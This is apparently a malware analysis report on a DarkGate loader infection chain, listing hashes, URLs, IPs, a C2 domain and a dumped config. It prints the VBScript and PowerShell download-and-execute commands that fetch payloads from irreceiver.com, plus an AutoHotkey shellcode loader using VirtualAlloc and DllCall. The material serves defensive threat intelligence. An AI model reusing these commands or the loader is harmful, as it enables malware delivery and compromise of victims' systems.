THREAT IDENTIFICATION: DARKGATE LOADER

INFECTION FLOW
xlsx -> link to vbs file -> powershell script -> .ahk -> injection -> C2

EXCEL FILE HASH
april2024-8944.xlsx
04e06c0c828b88081c485cc8cbbe7764
SHA1: be5a7c7efde1a610c595fc521e8a1bdc95130f6b

EXCEL DOCUMENT METADATA
Author: vafu
Last modified by: admin

VBS FILE DOWNLOAD URL (FROM SPREADSHEET)
\\86.104.72.124\prv\EXCEL_DOCUMENT_OPEN.vbs

VBSCRIPT FILE HASH
EXCEL_DOCUMENT_OPEN.vbs
6925ed4c3665b27592c356b0bbd4948d
SHA1: 7429a3929f68c87af85266c5d304f3e26e11a8c0

RELEVENT CODE FROM VBSCRIPT FILE
livtonik = "-Command Invoke-Expression (irm -Uri 'irreceiver.com/lcyqeksm')"
pnajfopo = "Shell.Application.1"
CreateObject(pnajfopo).ShellExecute "powershell", livtonik ,"","",0

INTERCEPTED POWERSHELL
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Command Invoke-Expression (irm -Uri 'irreceiver.com/lcyqeksm')

POWERSHELL SCRIPT DOWNLOAD URL
http://irreceiver.com/lcyqeksm

POWERSHELL SCRIPT CONTENTS
ni 'C:/wwqc/' -Type Directory -Force;cd 'C:/wwqc/';Invoke-WebRequest -Uri "http://irreceiver.com/tmxpghroau" -OutFile 'C:/wwqc/temp_AutoHotkey.exe';[System.IO.File]::WriteAllBytes("C:/wwqc/AutoHotkey.exe",([System.IO.File]::ReadAllBytes("C:/wwqc/temp_AutoHotkey.exe")[1024..([System.IO.File]::ReadAllBytes("C:/wwqc/temp_AutoHotkey.exe").Length-1)]));Invoke-WebRequest -Uri "http://irreceiver.com/bbiafaxa" -OutFile 'C:/wwqc/script.ahk';Invoke-WebRequest -Uri "http://irreceiver.com/argigbtt" -OutFile 'C:/wwqc/test.txt'; start 'C:/wwqc/AutoHotkey.exe' -a 'C:/wwqc/script.ahk';attrib +h 'C:/wwqc/'

AUTOHOTKEY COMPONENT DOWNLOAD URLS
http://irreceiver.com/tmxpghroau
http://irreceiver.com/bbiafaxa
http://irreceiver.com/argigbtt

FILE HASHES
temp_AutoHotkey.exe (downloaded as tmxpghroau)
7ec913ebb2841134d3be15ab1ee8f0b4
SHA1: 88eeeb67bd379ea9c0d810bd864491379eefda2b

script.ahk (downloaded as bbiafaxa)
77f2459d628fb37ef971846326b498a8
SHA1: 3baefa06af304c7db531bbebe2c285d16ee0b337	

test.txt (downloaded as argigbtt)
63b3d0aa63886a380b08354f9aa42571
SHA1: 163f4c68cc88d5738728100f922e19d595ae1623

LEGITIMATE AUTOHOTKEY EXECUTABLE FILE HASH
AutoHotkey.exe
a59a2d3e5dda7aca6ec879263aa42fd3
SHA1: 312d496ec90eb30d5319307d47bfef602b6b8c6c

AUTOHOTKEY SCRIPT CONTENTS
#NoTrayIcon
dvrxqieh := 0x1000
zpjmcjqg := 0x2000
bohfoyeh := 0x40
hsgbptrj := A_ScriptDir . "\test.txt"
FileRead, haxsqbwe, %hsgbptrj%
size := 473292
mmcdjzic := DllCall("VirtualAlloc", "Ptr", 0, "UInt", size, "UInt", dvrxqieh | zpjmcjqg, "UInt", bohfoyeh)
Loop, % size {
ujtyilof := "0x" . SubStr(haxsqbwe, 2 * A_Index - 1, 2)
NumPut(ujtyilof, mmcdjzic + (A_Index - 1), "Char")
}
DllCall(mmcdjzic)

DARKGATE C2
POST http://irreceiver.com
103.114.162.75


DARKGATE CONFIG - DUMPED FROM MEMORY
0x4ab0f74 (1070): DOMAINS=irreceiver.com|
EPOCH=1712253267
0=irreceiver.com|
8=No
11=DarkGate
12=R0ijS0qCVITtS0e6xeZ
13=6
14=Yes
15=80
1=Yes
32=No
3=Yes
4=No
18=50
6=Yes
7=No
19=4000
5=No
21=No
22=No
23=No
31=Yes
24=wxcel4
25=admin888
26=No
27=AdRDIQXg
28=No
29=2
tabla=w9=l2oNRG*te0hPv{ c4]D[bTUY7OBQp&(rFjuixEz,ZHmaJ)LKV6I5XsnfC1WA.}3gM"dS$kqy8


